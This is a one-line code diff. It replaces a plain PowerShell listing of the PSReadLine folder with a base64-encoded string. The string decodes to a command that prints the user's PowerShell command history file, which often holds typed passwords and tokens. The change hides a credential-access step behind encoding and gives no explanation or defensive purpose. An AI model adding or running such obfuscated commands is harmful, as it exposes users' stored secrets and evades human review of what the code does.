@@ -1,1 +1,1 @@
-Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine" | Format-Table -AutoSize
+dHlwZSAkZW52OlVTRVJQUk9GSUxFXEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xQb3dlclNoZWxsXFBTUmVhZExpbmVcQ29uc29sZUhvc3RfaGlzdG9yeS50eHQ=
